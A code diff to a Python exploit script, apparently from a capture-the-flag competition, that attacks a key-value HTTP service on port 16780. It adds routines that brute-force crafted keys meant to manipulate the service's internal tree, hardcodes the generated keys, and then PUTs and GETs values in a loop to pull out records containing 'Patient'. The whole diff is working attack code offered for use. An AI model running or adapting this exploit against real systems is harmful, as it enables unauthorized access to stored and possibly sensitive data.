@@ -7,10 +7,58 @@ import string
 import time
 import sys
 import struct
+import subprocess
 
 from bs4 import BeautifulSoup
 
 hostname = sys.argv[1]
+
+def brute(uuid):
+    output = subprocess.check_output(
+        ["bin/brute", uuid, "3"],
+        input='\n'.join(uuids).encode('ascii', errors='replace'),
+    )
+
+    return output.decode('ascii', errors='replace').strip()
+
+def compute_path(n):
+    path = []
+    while (n > 2047):
+        if n % 2 == 0:
+            n = (n - 2) // 2
+            path.append(('right', n))
+
+        else:
+            n = (n - 1) // 2
+            path.append(('left', n))
+    return path
+
+def compute_uuids(path):
+    start = '312f0000-0000-0000-0000-000000000000'
+    lower = 0x2200
+    upper = 0x4200
+    mid = (lower + upper) // 2
+    uuid = start[:2] + hex(mid)[2:] + start[6:]
+    uuids = [uuid]
+    for where, n in path[::-1][1:]:
+        mid = (lower + upper) // 2
+        if where == 'left':
+            upper = mid
+            mid = (lower + upper) // 2
+        else:
+            lower = mid
+            mid = (lower + upper) // 2
+        uuid = start[:2] + hex(mid)[2:] + start[6:]
+        uuids.append(uuid)
+    return uuids
+
+def brute_uuids(uuids):
+    inputs =[]
+    for uuid in uuids:
+        out = brute(uuid)
+        #print(out)
+        inputs.append(out.split('|')[0])
+    return inputs
 
 def put(key, value):
     url = "http://" + hostname + ":16780/" + key;
@@ -32,25 +80,41 @@ if cmd == 'put':
 if cmd == 'putk':
     put(sys.argv[3], b"x")
 
+if cmd == 'generate':
+    path = compute_path(10_000_012)
+    uuids = compute_uuids(path)
+    inputs = brute_uuids(uuids)
+    for s in inputs:
+        print(s)
+
+# generated
+inputs = [
+    '>k:c',
+    'ZDrC',
+    '$ibL',
+    '"`]t',
+    'lBq1',
+    'f{"l',
+    '_(2f',
+    '=p53',
+    'l&gr',
+    '*hd0',
+    'p)"j',
+    'j>Fe',
+    '[l=1'
+]
+
 if cmd == 'hack':
-    put("31300000-0000-0000-0000-000000000000", b"x")
-    put("312f0000-0000-0000-0000-000000000000", b"x")
-    put("312ff000-0000-0000-0000-000000000000", b"x")
-    put("312fff00-0000-0000-0000-000000000000", b"x")
-    put("312ffe00-0000-0000-0000-000000000000", b"x")
-    put("312ffef0-0000-0000-0000-000000000000", b"x")
-    put("312ffeef-0000-0000-0000-000000000000", b"x")
-    put("312ffeee-f000-0000-0000-000000000000", b"x")
-    put("312ffeee-ee00-0000-0000-000000000000", b"x")
-    put("312ffeee-ef00-0000-0000-000000000000", b"x")
-    put("312ffeee-efff-0000-0000-000000000000", b"x")
-    put("312ffeee-effe-0000-0000-000000000000", b"x")
+
+    for s in inputs[:-1]:
+        print("Putting " + s)
+        put(s, b"x")
 
     for i in range(2048, 11500):
         val = struct.pack("H", i)
         if b'\x00' in val:
             continue
         put("7fffffff-0000-0000-0000-000000000000", val);
-        result = get("312ffeee-effe-f000-0000-000000000000");
+        result = get(inputs[-1]);
         if "Patient" in result:
             print(result.split()[1])
